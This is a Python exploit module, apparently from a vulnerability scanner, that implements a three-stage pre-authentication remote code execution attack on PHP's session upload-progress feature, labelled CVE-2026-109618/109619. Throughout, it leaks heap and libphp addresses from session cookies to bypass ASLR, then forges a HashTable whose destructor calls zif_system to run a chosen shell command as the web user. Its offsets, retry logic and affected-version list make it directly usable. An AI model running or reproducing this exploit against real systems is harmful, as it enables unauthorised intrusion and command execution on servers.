"""poc/php2shell.py — native (in-scanner) implementation of the php2shell RCE.

This is the working logic of .tmp/a.py (CVE-2026-109618 OOM-corruption +
CVE-2026-109619 stale-global-state/UAF), ported so the SCANNER itself opens the
socket and sends the multipart exploit — no external script, no external binary.

Vector: session.upload_progress (RFC1867) heap use-after-free.
  Stage 0  worker rotation (fresh heap state)
  Stage 1  OOM-trigger -> heap chunk base leak via Set-Cookie: PHPSESSID
  Stage 2  HashTable allocation -> ZVAL_PTR_DTOR leak -> libphp.so base (ASLR bypass)
  Stage 3  forge fake HashTable (pDestructor=zif_system) + fake reference over
           PS(http_session_vars) -> arbitrary command executes as the web user.
Proof: the command writes to the webroot and we GET the proof path (real `id`).
"""
from __future__ import annotations

import re
import struct
import threading
import time
import urllib.parse
from collections import Counter

from . import _net

# ---- profile-calibrated stage params (from a.py) ----
BOOKWORM = {"stage1_n": 841, "stage2_t": 406, "stage2_v": 16,
            "stage3_pads": [(31, 31)] * 6, "carrier": True,
            "default": {"zif": 0x465370, "dtor": 0x65EB60, "htdata": 0x690D8}}
LAB = {"stage1_n": 892, "stage2_t": 443, "stage2_v": 1,
       "stage3_pads": [(8, 7)] + [(7, 7)] * 5, "carrier": False,
       "default": {"zif": 0x43A870, "dtor": 0x613C50, "htdata": 0x6E0D8}}
MAX_CMD = 14
SID = b"attacksessionid0001"


def _hex(x):
    if x is None:
        return None
    if isinstance(x, int):
        return x
    s = str(x).strip()
    if not s:
        return None
    if s.lower().startswith("0x"):
        return int(s, 16)
    # Offsets are ALWAYS hex. Force base-16 so "465370" -> 0x465370 (not decimal 465370).
    try:
        return int(s, 16)
    except ValueError:
        return None


def build_multipart(parts, boundary: bytes) -> bytes:
    out = bytearray()
    for p in parts:
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + p["name"].encode() + b'"'
        if p.get("filename") is not None:
            out += b'; filename="' + p["filename"].encode() + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def parse_cookie(resp: bytes) -> bytes:
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))


import re  # noqa: E402  (kept local to mirror a.py ordering)


def chunk_base_from_cookie(raw: bytes) -> int:
    if len(raw) < 1000:
        return 0
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0


def libphp_base_from_cookie(raw: bytes, dtor_offset: int) -> int:
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x7F0000000000 <= p < 0x800000000000):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0


class _Target:
    """HTTP target with a concurrent reader (worker may abort mid-body)."""

    def __init__(self, host, port, tls, timeout, path="/"):
        self.host, self.port, self.tls, self.timeout = host, port, tls, timeout
        self.path = path or "/"

    def _connect(self):
        last = None
        for _ in range(10):
            try:
                s = _net._connect(self.host, self.port, self.tls, self.timeout)
                return s
            except OSError as e:
                last = e
                time.sleep(0.3)
        raise last

    def post(self, body, boundary, read_cap=1 << 20, timeout=None, extra_headers=None):
        extra = ""
        for k, v in (extra_headers or {}).items():
            extra += f"{k}: {v}\r\n"
        hdr = (f"POST {self.path} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n{extra}"
               f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
               f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
        s = self._connect()
        s.settimeout(timeout or self.timeout)
        data = bytearray()

        def _reader():
            try:
                while len(data) < read_cap:
                    c = s.recv(65536)
                    if not c:
                        break
                    data.extend(c)
            except OSError:
                pass

        r = threading.Thread(target=_reader, daemon=True)
        r.start()
        try:
            try:
                s.sendall(hdr)
                mv = memoryview(body)
                for off in range(0, len(body), 262144):
                    s.sendall(mv[off:off + 262144])
            except OSError:
                pass
            r.join(timeout=(timeout or self.timeout) + 1.0)
        finally:
            try:
                s.close()
            except OSError:
                pass
        return bytes(data)


class _Exploit:
    def __init__(self, tgt, cmd, zif, dtor, htdata, huge_mb, profile, log):
        self.t = tgt
        self.cmd = cmd.encode()
        self.zif, self.dtor, self.htdata = zif, dtor, htdata
        self.huge_mb = huge_mb
        self.log = log
        cfg = BOOKWORM if profile == "bookworm" else LAB
        self.stage1_n = cfg["stage1_n"]
        self.stage2_t = cfg["stage2_t"]
        self.stage2_v = cfg["stage2_v"]
        self.stage3_pads = list(cfg["stage3_pads"])
        self.carrier = cfg["carrier"]

    def _big_field(self):
        return {"name": "big", "data": b"B" * (self.huge_mb * 1024 * 1024)}

    def _file_part(self):
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def rotate(self):
        self.log("[*] worker rotasyonu (HTTP abort)")
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"},
                  {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
                  self._file_part(), self._big_field()]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20,
                    timeout=max(90.0, self.t.timeout))
        time.sleep(0.3)
        parts = [{"name": "PHPSESSID", "data": SID},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        self.t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20.0)
        time.sleep(0.5)

    def stage1(self):
        parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"},
                  {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
                  self._file_part(), self._big_field()]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20,
                    timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)
        parts = [{"name": "PHPSESSID", "data": SID},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(self.stage1_n):
            val = (f"v{i:04d}" + "x" * 44)[:48]
            parts.append({"name": str(1000 + i), "data": val.encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})
        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
        return chunk_base_from_cookie(parse_cookie(resp))

    def stage2(self):
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"},
                  {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
                  self._file_part(), self._big_field()]
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20,
                    timeout=max(90.0, self.t.timeout))
        time.sleep(0.2)
        parts = [{"name": "PHPSESSID", "data": SID},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        for i in range(983):
            cnt = 16 if i == self.stage2_t else 1
            for j in range(cnt):
                parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * self.stage2_v})
        resp = self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=1 << 20)
        return libphp_base_from_cookie(parse_cookie(resp), self.dtor)

    def _fake_payload(self, htdata, zif):
        cmd = self.cmd
        ht = bytearray(b"\x00" * 167)
        struct.pack_into("<II", ht, 0x00, 1, 7)
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
        struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
        struct.pack_into("<II", ht, 0x18, 1, 1)
        struct.pack_into("<II", ht, 0x20, 8, 0)
        struct.pack_into("<Q", ht, 0x28, 0)
        struct.pack_into("<Q", ht, 0x30, zif)
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x00, 0)
        struct.pack_into("<Q", ht, E + 0x08, 0)
        struct.pack_into("<Q", ht, E + 0x10, zif)
        struct.pack_into("<Q", ht, E + 0x18, 0)
        struct.pack_into("<Q", ht, E + 0x20, 0)
        struct.pack_into("<I", ht, E + 0x28, 0)
        struct.pack_into("<I", ht, E + 0x2C, 1)
        struct.pack_into("<Q", ht, E + 0x30, 0)
        struct.pack_into("<Q", ht, E + 0x38, 0)
        struct.pack_into("<I", ht, E + 0x40, 0)
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
        struct.pack_into("<I", ht, E + 0x58, 6)
        struct.pack_into("<II", ht, 0x80, 1, 0x106)
        struct.pack_into("<Q", ht, 0x88, 0)
        struct.pack_into("<Q", ht, 0x90, len(cmd))
        ht[0x98:0x98 + len(cmd)] = cmd
        ht[0x98 + len(cmd)] = 0
        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)
        struct.pack_into("<Q", ref, 0x18, htdata)
        struct.pack_into("<Q", ref, 0x20, 0x307)
        struct.pack_into("<Q", ref, 0x28, 0)
        return bytes(ht), bytes(ref)

    def stage3(self, htdata, zif):
        parts = [{"name": "PHPSESSID", "data": b"a" * 19},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3}]
        for i, (nl, vl) in enumerate(self.stage3_pads):
            name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
            parts.append({"name": name, "data": b"V" * vl})
        parts += [self._file_part(), self._big_field()]
        extra = {"Cookie": "PHPSESSID=" + "a" * 32} if self.carrier else None
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20,
                    timeout=max(90.0, self.t.timeout), extra_headers=extra)
        time.sleep(0.3)
        ht, ref = self._fake_payload(htdata, zif)
        parts = [{"name": "PHPSESSID", "data": SID},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
        if self.carrier:
            carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
            parts.append({"name": "g00", "data": carrier})
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
        else:
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": ref})
        self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=65536, timeout=30.0)


def run(params: dict) -> dict:
    url = (params.get("url") or params.get("target") or "").strip()
    if not url:
        return {"ok": False, "success": False, "error": "url/target gerekli"}
    cmd = (params.get("cmd") or "id>/out/p1").strip()
    profile = params.get("profile") or "bookworm"
    if profile not in ("lab", "bookworm"):
        profile = "bookworm"
    huge_mb = int(params.get("huge_mb", 12))
    retries = int(params.get("retries", 3))
    proof_fetch = params.get("proof_fetch", "/out/p1")

    if len(cmd.encode()) > MAX_CMD:
        return {"ok": False, "success": False,
                "error": f"komut {len(cmd.encode())} byte; 167-byte tasiyici max {MAX_CMD} (orn. 'sh</out/c')"}

    tgt_p = _net.parse_target(url, default_port=80)
    # Extract the path from the URL (e.g. http://host:port/p.php -> /p.php)
    import urllib.parse as _up
    _parsed = _up.urlparse(url if "://" in url else "http://" + url)
    _path = _parsed.path or "/"
    tgt = _Target(tgt_p["host"], tgt_p["port"], tgt_p["tls"], float(params.get("timeout", 30)), path=_path)

    dflt = BOOKWORM["default"] if profile == "bookworm" else LAB["default"]
    zif = _hex(params.get("zif")) or dflt["zif"]
    dtor = _hex(params.get("dtor")) or dflt["dtor"]
    htdata = _hex(params.get("htdata")) or dflt["htdata"]

    log = []
    ex = _Exploit(tgt, cmd, zif, dtor, htdata, huge_mb, profile,
                  lambda m: (log.append(m), print(m, flush=True)))

    log.append(f"[*] hedef={url} profil={profile} cmd={cmd!r}")
    log.append(f"[*] offsetler: zif=0x{zif:x} dtor=0x{dtor:x} htdata=0x{htdata:x}")

    ex.rotate()

    # ---- stage 1: heap chunk base ----
    chunk = 0
    for a in range(1, retries + 1):
        log.append(f"[*] stage1 heap leak ({a}/{retries})")
        try:
            chunk = ex.stage1()
        except OSError as e:
            log.append(f"[-] stage1 hata: {e}")
            chunk = 0
        if chunk:
            log.append(f"[+] chunk base = 0x{chunk:x}")
            break
        log.append("[-] heap leak kacti")
        ex.rotate()
    if not chunk:
        return {"ok": True, "success": False, "status": None,
                "evidence": "", "detail": {"stage": "stage1_failed",
                                           "note": "heap chunk leak alinamadi (mitigation/profil/offset uyumsuz)"},
                "log": log}
    ex.rotate()

    # ---- stage 2: libphp base ----
    libphp = 0
    for a in range(1, retries + 1):
        log.append(f"[*] stage2 libphp leak ({a}/{retries})")
        try:
            libphp = ex.stage2()
        except OSError as e:
            log.append(f"[-] stage2 hata: {e}")
            libphp = 0
        if libphp:
            log.append(f"[+] libphp base = 0x{libphp:x}")
            break
        log.append("[-] libphp leak kacti")
        ex.rotate()
    if not libphp:
        return {"ok": True, "success": False, "status": None,
                "evidence": "", "detail": {"stage": "stage2_failed", "chunk_base": hex(chunk),
                                           "note": "libphp base leak alinamadi (dtor offset build'e uymuyor olabilir)"},
                "log": log}
    ex.rotate()

    # ---- stage 3: forge + execute ----
    htdata_abs = chunk + htdata
    zif_abs = libphp + zif
    log.append(f"[*] stage3 HTDATA=0x{htdata_abs:x} ZIF=0x{zif_abs:x}")
    for a in range(1, retries + 3):
        log.append(f"[*] stage3 execute ({a}/{retries + 2})")
        try:
            ex.stage3(htdata_abs, zif_abs)
        except OSError as e:
            log.append(f"[-] stage3 istek hatasi: {e}")
        time.sleep(0.8)

    # ---- proof: GET the webroot proof path (real `id`) ----
    evidence = ""
    status = None
    try:
        r = _net.http("GET", tgt.host, tgt.port, proof_fetch, timeout=15, tls=tgt.tls)
        status = r["status"]
        if r["body"]:
            evidence = r["body"].decode("latin1", "replace").strip()
        log.append(f"[*] proof GET {proof_fetch} -> HTTP {status}, {len(r['body'])} byte")
    except Exception as e:
        log.append(f"[-] proof fetch hatasi: {e}")

    success = bool(evidence) and ("uid=" in evidence or evidence.strip())
    return {
        "ok": True,
        "success": success,
        "status": status,
        "evidence": evidence,
        "detail": {
            "stage": "done",
            "chunk_base": hex(chunk),
            "libphp_base": hex(libphp),
            "zif_abs": hex(zif_abs),
            "htdata_abs": hex(htdata_abs),
            "proof_fetch": proof_fetch,
        },
        "log": log,
    }


EXPLOITS = {
    "CVE-2026-109618": {
        "name": "php2shell OOM corruption RCE (session.upload_progress)",
        "type": "RCE", "preauth": True,
        "affected": ["5.4", "5.5", "5.6", "7.0", "7.1", "7.2", "7.3", "7.4", "8.0", "8.1", "8.2", "8.3", "8.4", "8.5"],
        "note": "Native engine — scanner socket'i acar, 3 asamayi atar, id kanitini GET ile okur. Gerekli: memory_limit<post_max, display_errors=1, profil/offset build ile uyumlu.",
        "inputs": [
            {"key": "url", "label": "Hedef PHP sayfasi", "req": True, "default": "",
             "placeholder": "http://LAB_IP:18111/index.php"},
            {"key": "cmd", "label": "Komut (max 14 byte)", "req": False, "default": "id>/out/p1"},
            {"key": "profile", "label": "Profil", "req": False, "default": "bookworm"},
            {"key": "zif", "label": "zif_system offset (hex)", "req": False, "default": "465370"},
            {"key": "dtor", "label": "ZVAL_PTR_DTOR offset (hex)", "req": False, "default": "65eb60"},
            {"key": "htdata", "label": "htdata offset (hex)", "req": False, "default": "690d8"},
            {"key": "proof_fetch", "label": "Kanit path (webroot)", "req": False, "default": "/out/p1"},
            {"key": "retries", "label": "Retry (asama basina)", "req": False, "default": "3"},
        ],
        "run": run,
    },
    "CVE-2026-109619": {
        "name": "php2shell stale-global-state UAF RCE (session.upload_progress)",
        "type": "RCE", "preauth": True,
        "affected": ["5.4", "5.5", "5.6", "7.0", "7.1", "7.2", "7.3", "7.4", "8.0", "8.1", "8.2", "8.3", "8.4", "8.5"],
        "note": "109619 = stale global state / UAF; ayni RFC1867 vektoru, ayni native engine (109618+109619).",
        "inputs": [
            {"key": "url", "label": "Hedef PHP sayfasi", "req": True, "default": "",
             "placeholder": "http://LAB_IP:18111/index.php"},
            {"key": "cmd", "label": "Komut (max 14 byte)", "req": False, "default": "id>/out/p1"},
            {"key": "profile", "label": "Profil", "req": False, "default": "bookworm"},
            {"key": "zif", "label": "zif_system offset (hex)", "req": False, "default": "465370"},
            {"key": "dtor", "label": "ZVAL_PTR_DTOR offset (hex)", "req": False, "default": "65eb60"},
            {"key": "htdata", "label": "htdata offset (hex)", "req": False, "default": "690d8"},
            {"key": "proof_fetch", "label": "Kanit path (webroot)", "req": False, "default": "/out/p1"},
            {"key": "retries", "label": "Retry (asama basina)", "req": False, "default": "3"},
        ],
        "run": run,
    },
}
